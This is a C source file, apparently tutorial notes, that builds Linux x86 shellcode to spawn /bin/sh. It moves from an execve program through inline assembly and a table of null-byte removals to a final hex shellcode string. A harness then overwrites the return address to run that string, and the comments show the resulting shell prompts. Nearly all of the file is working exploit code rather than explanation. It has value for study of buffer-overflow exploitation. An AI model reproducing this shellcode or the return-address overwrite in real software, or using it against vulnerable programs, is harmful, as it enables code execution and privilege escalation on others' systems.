#include <unistd.h>
#include <stdlib.h>

/*
 If we compile this code and run it, we can see that it will spawn a shell for us.

[jack@0day local]$ gcc shell.c -o shell
[jack@0day local]$ ./shell
sh-2.05b# 
*/
int main()
{
  char *name[2];
   
  name[0] = "/bin/sh";
  name[1] = 0x0;
  execve(name[0], name, 0x0);
  exit(0);
}

/*
It works! But there is an obstacle.  In most cases we'll be trying to
overflow a character buffer.  As such any null bytes in our shellcode will be
considered the end of the string, and the copy will be terminated.  There must
be no null bytes in the shellcode for the exploit to work.  Let's try to
eliminate the bytes (and at the same time make it smaller).

           Problem instruction:                 Substitute with:
           --------------------------------------------------------
           movb   $0x0,0x7(%esi)                xorl   %eax,%eax
           molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
                                                movl   %eax,0xc(%esi)
           --------------------------------------------------------
           movl   $0xb,%eax                     movb   $0xb,%al
           --------------------------------------------------------
           movl   $0x1, %eax                    xorl   %ebx,%ebx
           movl   $0x0, %ebx                    movl   %ebx,%eax
                                                inc    %eax
           --------------------------------------------------------
*/
void main_t2() {
__asm__("
        jmp    0x2a                     # 3 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)           # 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax               # 5 bytes
        movl   $0x0, %ebx               # 5 bytes
        int    $0x80                    # 2 bytes
        call   -0x2f                    # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
");
}


void main_t3() {
__asm__("
        jmp    0x1f                     # 2 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        xorl   %eax,%eax                # 2 bytes
        movb   %eax,0x7(%esi)           # 3 bytes
        movl   %eax,0xc(%esi)           # 3 bytes
        movb   $0xb,%al                 # 2 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        xorl   %ebx,%ebx                # 2 bytes
        movl   %ebx,%eax                # 2 bytes
        inc    %eax                     # 1 bytes
        int    $0x80                    # 2 bytes
        call   -0x24                    # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
                                        # 46 bytes total
");
}



char shellcode[] =    
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
   

/*
  Now run the program.

[jack@0day local]$ gcc shellcode.c -o shellcode
[jack@0day local]$ ./shellcode
sh-2.05b# 

*/    
int main_t()
{
   
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}

